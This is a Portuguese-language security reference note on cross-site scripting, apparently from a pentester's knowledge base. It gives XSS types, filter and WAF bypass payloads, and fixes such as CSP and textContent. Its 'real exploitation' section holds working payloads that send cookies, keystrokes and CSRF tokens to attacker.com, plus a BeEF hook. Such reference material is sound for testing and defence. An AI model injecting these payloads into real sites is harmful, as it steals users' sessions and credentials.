# XSS  Cross-Site Scripting

**Tags:** #medio #alto #xss #frontend #injecao #javascript
**OWASP:** A03:2021  Injection
**CVSS Base:** 6.1 (Médio)  8.8 (Alto  Stored XSS com CSP ausente)

---

## 📖 O que é

XSS permite que um atacante injete scripts maliciosos em páginas web visualizadas por outros usuários. O browser da vítima executa o script no contexto da aplicação alvo.

---

## 🔍 `grep_search` Táticas

```
innerHTML
document.write(
dangerouslySetInnerHTML
outerHTML
insertAdjacentHTML
v-html
eval(
setTimeout(str
setInterval(str
location.href =
element.src =
.href = req
```

---

## 📊 Tipos de XSS

### 1. XSS Refletido (Stored=No)
- Payload vive na URL ou parâmetro
- Não é persistido no servidor
- Requer que a vítima clique em um link malicioso
- **Severidade:** BaixoMédio

```
URL: http://target.com/search?q=<script>alert(1)</script>
Servidor reflete: <p>Resultados para <script>alert(1)</script></p>
```

### 2. XSS Stored (Persistente)
- Payload é salvo no banco de dados/servidor
- Executado para todos os usuários que visualizam a página
- **Severidade:** AltoCrítico (especialmente em áreas de admin)

```
Comentário malicioso: <script>document.location='http://attacker.com/?c='+document.cookie</script>
 Todo usuário que lê o comentário tem os cookies roubados
```

### 3. DOM-Based XSS
- O payload nunca vai ao servidor
- Flui de uma source DOM para um sink DOM no navegador
 Ver: [[dom-based-xss-postmessage]]

---

## 💣 Payloads de Detecção

### Básicos (testes iniciais)
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Bypass de Filtros Simples
```html
<!-- Broken tag bypass -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<script>&#097;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>

<!-- Event handlers sem script tag -->
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror="alert(1)">

<!-- javascript: protocol -->
<a href="javascript:alert(1)">clique</a>

<!-- Template literals -->
<script>alert`1`</script>
```

### Bypass de WAF (filtros de `alert`)
```html
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(document.cookie)</script>
<svg/onload=eval(atob('YWxlcnQoMSk='))>    Base64 de alert(1)
```

---

## 💣 Payloads de Exploração Real

### Roubo de Cookie (Session Hijacking)
```html
<script>
fetch('https://attacker.com/?c=' + btoa(document.cookie))
</script>

<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
```

### Keylogger
```html
<script>
document.addEventListener('keydown', e => {
  fetch('https://attacker.com/k?key=' + e.key);
});
</script>
```

### Defacement Silencioso (para demonstração)
```html
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
```

### BeEF Hook (Browser Exploitation Framework)
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

### Exfiltração de Token CSRF
```html
<script>
fetch('/api/csrf-token')
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/?t=' + data.token));
</script>
```

---

## 🧪 Contexto de Injeção

Identificar **onde** o input é refletido determina o payload correto:

| Contexto | Exemplo | Payload |
|---|---|---|
| HTML body | `<p>INPUT</p>` | `<script>alert(1)</script>` |
| Atributo HTML | `<input value="INPUT">` | `"><script>alert(1)</script>` |
| Atributo de evento | `<div onmouseover="INPUT">` | `alert(1)` |
| JavaScript string | `var name = "INPUT";` | `";alert(1)//` |
| URL | `href="INPUT"` | `javascript:alert(1)` |
| CSS | `style="color:INPUT"` | `red;}</style><script>alert(1)</script>` |

---

## 🛡️ Correção

```javascript
//  React  JSX escapa por padrão
return <p>{userInput}</p>; // seguro

//  Nunca usar dangerouslySetInnerHTML com input externo
return <div dangerouslySetInnerHTML={{__html: userInput}} />; // PERIGOSO
```

```javascript
//  Vanilla JS  usar textContent, não innerHTML
element.textContent = userInput; // seguro
// element.innerHTML = userInput; //  PERIGOSO
```

```python
#  Flask/Jinja2  auto-escape habilitado por padrão em .html
# em render_template_string: {{ input }} é seguro, {{ input | safe }} não é
```

**Content-Security-Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

---

## 🔗 Chain Exploits

```
XSS + ausência de CSP  Severidade máxima da categoria
XSS Stored + Admin Panel  Comprometimento de tudo que o admin acessa
XSS + CSRF token leak  CSRF bypass completo
XSS + WebSocket  Leitura de mensagens privadas em tempo real
XSS refletido + Open Redirect  URL de phishing confiável
XSS + window.postMessage  Cross-origin data exfiltration
```

---

## 📌 Referências
- [[dom-based-xss-postmessage]]
- [[http-security-headers]]
- [[csrf-websocket-hijacking-cswsh]]
- [[open-redirect]]
